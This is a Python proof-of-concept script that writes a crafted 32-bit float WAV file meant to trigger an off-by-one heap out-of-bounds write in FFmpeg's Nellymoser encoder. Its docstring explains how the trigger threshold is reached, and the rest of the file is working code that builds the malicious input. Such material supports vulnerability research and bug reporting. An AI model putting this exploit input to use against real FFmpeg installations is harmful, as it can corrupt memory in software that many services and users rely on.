#!/usr/bin/env python3
"""
PoC generator for VULN-001: get_exponent_dynamic off-by-one heap OOB write
in FFmpeg nellymoserenc.c

The vulnerability requires cand[band] >= (OPT_SIZE - 1000) = 34768 so that
  idx_max = FFMIN(OPT_SIZE, cand[band-1] + q) == OPT_SIZE == 35768
When idx == 35768 the break condition `idx > idx_max` (strict >) is NOT taken,
leading to an OOB write at opt[band][35768] / path[band][35768].

cand[band] = log2(coeff_sum / (band_size << 7)) * 1024.0
For band=0 (band_size=2): coeff_sum >= 256 * 2^33.96 ≈ 4.1e12

MDCT of float samples with amplitude ~1e6 yields coefficients squared on the
order of 1e12+, easily satisfying the trigger threshold.  We use alternating
+/- samples to maximise high-frequency energy captured by the MDCT.
"""
import struct
import os

SAMPLE_RATE   = 8000
NUM_CHANNELS  = 1
BITS_PER_SAMPLE = 32   # 32-bit float
FORMAT_CODE   = 3      # IEEE_FLOAT
AMPLITUDE     = 1e6    # Large magnitude to push cand[] past the threshold
DURATION_SECS = 10     # 10 seconds of audio = 80 000 samples

NUM_SAMPLES = SAMPLE_RATE * DURATION_SECS  # 80 000

# Build alternating +A/-A samples for maximum frequency content
samples = []
for i in range(NUM_SAMPLES):
    samples.append(AMPLITUDE if i % 2 == 0 else -AMPLITUDE)

# Pack as little-endian float32
sample_data = struct.pack('<' + 'f' * NUM_SAMPLES, *samples)
data_size = len(sample_data)

byte_rate   = SAMPLE_RATE * NUM_CHANNELS * (BITS_PER_SAMPLE // 8)
block_align = NUM_CHANNELS * (BITS_PER_SAMPLE // 8)

# Construct WAV chunks
fmt_chunk = struct.pack('<HHIIHH',
    FORMAT_CODE,      # wFormatTag  = 3 (IEEE_FLOAT)
    NUM_CHANNELS,     # nChannels
    SAMPLE_RATE,      # nSamplesPerSec
    byte_rate,        # nAvgBytesPerSec
    block_align,      # nBlockAlign
    BITS_PER_SAMPLE,  # wBitsPerSample
)

riff_size = 4 + (8 + len(fmt_chunk)) + (8 + data_size)

wav = (
    b'RIFF' + struct.pack('<I', riff_size) + b'WAVE' +
    b'fmt ' + struct.pack('<I', len(fmt_chunk)) + fmt_chunk +
    b'data' + struct.pack('<I', data_size) + sample_data
)

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.wav')
with open(out_path, 'wb') as f:
    f.write(wav)

print(f"Generated {out_path} ({len(wav)} bytes, {NUM_SAMPLES} float32 samples at ±{AMPLITUDE:.0e})")
print(f"WAV: {SAMPLE_RATE} Hz, mono, 32-bit IEEE float, {DURATION_SECS}s")
